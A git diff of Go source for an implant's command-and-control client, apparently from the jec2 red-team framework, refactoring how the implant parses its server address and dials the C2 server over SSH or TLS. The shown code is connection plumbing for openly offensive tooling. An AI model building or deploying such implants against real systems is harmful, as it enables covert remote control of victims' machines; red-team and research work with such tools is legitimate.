@@ -1,28 +1,43 @@
 package main
 
 /*
- * implant2server.go
+ * c2ssh.go
  * Comms between the implant and server.
  * By J. Stuart McMurray
  * Created 20220327
- * Last Modified 20220331
+ * Last Modified 20220402
  */
 
 import (
 	"crypto/subtle"
-	"crypto/tls"
 	"fmt"
 	"net"
+	"net/url"
 	"os"
 	"os/user"
 	"strconv"
 	"strings"
 
+	"github.com/magisterquis/jec2/pkg/common"
 	"golang.org/x/crypto/ssh"
 )
 
 // ConnectToC2 makes an SSH connection to the C2 server.
-func ConnectToC2() (ssh.Conn, <-chan ssh.NewChannel, <-chan *ssh.Request, error) {
+func ConnectToC2() (
+	ssh.Conn,
+	<-chan ssh.NewChannel,
+	<-chan *ssh.Request,
+	error,
+) {
+	/* Work out how to connect to the server. */
+	u, err := url.Parse(ServerAddr)
+	if nil != err {
+		return nil, nil, nil, fmt.Errorf(
+			"parsing server address: %w",
+			err,
+		)
+	}
+
 	/* Roll a config to auth to the server. */
 	conf := &ssh.ClientConfig{
 		User: getUsername(),
@@ -37,11 +52,10 @@ func ConnectToC2() (ssh.Conn, <-chan ssh.NewChannel, <-chan *ssh.Request, error)
 	var (
 		c    net.Conn
 		addr string
-		err  error
 	)
-	switch strings.ToLower(ServerProto) {
+	switch strings.ToLower(u.Scheme) {
 	case "ssh":
-		c, err = net.Dial("tcp", ServerAddr)
+		c, err = net.Dial("tcp", u.Host)
 		if nil != err {
 			break
 		}
@@ -52,18 +66,7 @@ func ConnectToC2() (ssh.Conn, <-chan ssh.NewChannel, <-chan *ssh.Request, error)
 			c.RemoteAddr(),
 		)
 	case "tls":
-		/* Work out the hostname. */
-		h, _, err := net.SplitHostPort(ServerAddr)
-		if nil != err {
-			return nil, nil, nil, fmt.Errorf(
-				"Error extracting hostname from %q: %s",
-				ServerAddr,
-				err,
-			)
-		}
-		c, err = tls.Dial("tcp", ServerAddr, &tls.Config{
-			ServerName: h,
-		})
+		c, err := common.DialTLS(u.Host)
 		if nil != err {
 			break
 		}
@@ -76,7 +79,7 @@ func ConnectToC2() (ssh.Conn, <-chan ssh.NewChannel, <-chan *ssh.Request, error)
 	default:
 		return nil, nil, nil, fmt.Errorf(
 			"unimplemented protocol %q",
-			ServerProto,
+			u.Scheme,
 		)
 	}
 	if nil != err {
